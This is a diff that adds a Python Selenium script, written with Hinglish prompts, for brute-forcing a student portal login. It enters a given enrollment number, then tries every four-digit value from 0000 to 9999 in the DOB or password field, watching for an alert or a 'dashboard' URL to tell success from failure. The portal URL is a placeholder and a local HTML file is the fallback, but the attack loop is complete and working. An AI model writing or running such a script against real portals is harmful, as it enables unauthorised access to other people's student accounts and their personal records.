@@ -1,1 +1,117 @@
+import os
+import time
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from webdriver_manager.chrome import ChromeDriverManager
 
+demo_dobs = [f"{s:04d}" for s in range(10000)]
+
+def get_next_dob():
+    
+    if demo_dobs:
+        return demo_dobs.pop(0)
+    return None
+
+portal_url = "apni file ka name  ya local web ka name likho yhan pr "
+local_html_file = f"file://{os.path.abspath('index.html')}"
+
+enrollment_no = input("Apna Enrollment Number daalein: ").strip()
+dob = input("Apna DOB daalein: ").strip()
+
+options = webdriver.ChromeOptions()
+options.add_argument("--start-maximized")
+driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
+
+def check_login_status(driver, timeout=1.5):
+   
+    start_time = time.time()
+    while time.time() - start_time < timeout:
+        
+        try:
+            alert = driver.switch_to.alert
+            alert_text = alert.text
+            alert.accept()
+            return False, alert_text
+        except Exception:
+            pass
+
+        
+        if "dashboard" in driver.current_url.lower():
+            return True, "Dashboard detected"
+
+        time.sleep(0.05)
+
+    return False, "Timeout"
+
+try:
+    print(f"\nWebsite open ho rahi hai: {portal_url}")
+    try:
+        driver.get(portal_url)
+    except Exception:
+        driver.get(local_html_file)
+
+    wait = WebDriverWait(driver, 5)
+
+   
+    try:
+        student_btn = driver.find_element(
+            By.XPATH, "//input[@type='radio' and contains(@value, 'Student')] | //label[contains(text(), 'Student')]"
+        )
+        driver.execute_script("arguments[0].click();", student_btn)
+    except Exception:
+        pass
+
+    
+    enroll_input = wait.until(EC.visibility_of_element_located((
+        By.XPATH, "//input[contains(@id, 'txtEnrollment') or contains(@placeholder, 'email/Enrollment')][1]"
+    )))
+    enroll_input.clear()
+    enroll_input.send_keys(enrollment_no)
+
+   
+    try:
+        dob_field = driver.find_element(By.XPATH, "//input[contains(@id, 'txtDOB') or @type='password']")
+    except Exception:
+        enroll_input.click()
+        enroll_input.send_keys(Keys.TAB)
+        dob_field = driver.switch_to.active_element
+
+    login_btn = driver.find_element(By.XPATH, "//button[contains(@id, 'btnLogin')] | //input[@type='submit']")
+
+   
+    while True:
+        # Fast Clear & Enter DOB
+        dob_field.send_keys(Keys.COMMAND + "a")
+        dob_field.send_keys(Keys.CONTROL + "a")
+        dob_field.send_keys(Keys.BACKSPACE)
+        dob_field.send_keys(dob)
+
+       
+        driver.execute_script("arguments[0].click();", login_btn)
+
+       
+        is_success, msg = check_login_status(driver)
+        if is_success:
+            print("\n" + "=" * 50)
+            print(f"🎉 SUCCESS! Sahi DOB mila ({dob}), Login ho gaya!")
+            print("=" * 50)
+            break
+        else:
+            print(f"❌ Galat DOB: {dob}")
+            RETRY_DOB = get_next_dob()
+            if not RETRY_DOB:
+                print("Khatam: get_next_dob() ne koi DOB nahi diya.")
+                break
+            dob = str(RETRY_DOB).strip()
+
+except Exception as e:
+    print(f"\nError: {e}")
+
+finally:
+    print("\nBrowser band karne ke liye Enter dabayein...")
+    input()
+    driver.quit()
